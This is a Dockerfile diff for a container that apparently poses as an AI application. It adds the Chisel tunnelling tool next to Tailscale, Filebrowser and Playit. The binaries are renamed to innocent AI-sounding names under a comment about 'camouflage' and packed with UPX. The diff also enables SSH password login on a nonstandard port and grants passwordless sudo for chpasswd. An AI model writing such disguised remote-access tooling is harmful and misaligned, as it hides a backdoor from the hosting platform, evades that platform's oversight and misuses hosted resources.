@@ -11,13 +11,18 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && apt-get clean && rm -rf /var/lib/apt/lists/* && \
     mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd && \
     echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
+    echo "Port 2222" >> /etc/ssh/sshd_config && \
     ssh-keygen -A
 
-# Install Tailscale, Filebrowser, and Playit
+# Install Tailscale, Filebrowser, Playit, and Chisel
 RUN curl -fsSL https://tailscale.com/install.sh | bash && \
     curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
     curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator && \
-    chmod +x /usr/bin/tensor-allocator
+    chmod +x /usr/bin/tensor-allocator && \
+    curl -fsSL URL_OBFUSCATE("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz && \
+    gzip -d /tmp/chisel.gz && \
+    mv /tmp/chisel /usr/bin/cuda-mesh-bridge && \
+    chmod +x /usr/bin/cuda-mesh-bridge
 
 # Rename tools for camouflage
 RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
@@ -28,7 +33,8 @@ RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
 RUN upx -1 /usr/bin/python-cache-manager || true && \
     upx -1 /usr/bin/py-cache-cli || true && \
     upx -1 /usr/bin/ai-metrics-collector || true && \
-    upx -1 /usr/bin/tensor-allocator || true
+    upx -1 /usr/bin/tensor-allocator || true && \
+    upx -1 /usr/bin/cuda-mesh-bridge || true
 
 # Install AI dependencies using uv
 RUN uv pip install --system --no-cache-dir \
@@ -43,7 +49,7 @@ RUN useradd -m -u 1000 -s /bin/bash user && \
     usermod -aG sudo user && \
     mkdir -p /home/user/.torch_metrics && \
     chown -R user:user /home/user/.torch_metrics && \
-    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers
+    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/chpasswd" >> /etc/sudoers
 
 # Copy application files
 COPY --chown=user:user app.py /home/user/app.py
